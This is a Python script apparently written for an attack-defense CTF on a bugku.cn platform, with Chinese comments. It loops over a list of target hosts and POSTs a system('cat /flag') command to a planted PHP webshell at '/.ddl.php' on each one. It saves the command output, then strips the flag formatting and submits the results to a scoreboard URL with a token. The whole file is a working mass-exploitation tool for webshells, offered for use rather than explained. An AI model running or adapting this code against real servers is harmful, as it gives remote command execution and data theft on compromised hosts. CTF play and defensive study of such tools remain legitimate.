import requests
import re
from urllib import request
import time


def getflag():
    #url_template = 'http://192-168-1-{}.pvp6022.bugku.cn/poc.php'  # 填写不死马的位置
    url_add='/.ddl.php'
    cmd = {'123': "system('cat /flag');"}
    #C:\Users\LEGION\Desktop\1\html\upload\plugins\yjh.php
    
    # 从文件中读取IP尾号
    with open(r'F:\addl\awd\hosts.txt', mode='r', encoding='utf-8') as f:
        ip_list = [line.strip() for line in f.readlines()]
    
    for ip in ip_list:
        try:
            url = ip+url_add
            print(url)
            b = requests.post(url, data=cmd, timeout=1)
            #b=requests.get(url,timeout=1)
            with open(r'F:\addl\awd\flag.txt', mode='a+', encoding='utf-8') as f:
                f.write(b.text)
        except Exception as e:
            print(f"[!] 请求 {url} 失败: {e}")



def intoflag():

    f=open(r'F:\addl\awd\flag.txt',mode='r+')
    while 1:
       flag = f.readline()
       if not flag:
          break
       else:
          F1 = re.sub('{','',flag)
          F2 = re.sub('}','',F1)
          F3 = re.sub('flag','',F2,1)
          response = request.urlopen('https://ctf.bugku.com/pvp/submit.html?token=[b72da82d548ecb5f761462967b248e61]&flag='+F3+'',timeout=1)
          res = response.read().decode('utf-8')
          print (res)

    f.close()

if __name__ =='__main__':

    print('后续攻击开始展开......')
    getflag()
    intoflag()
    print('AttackOver！')


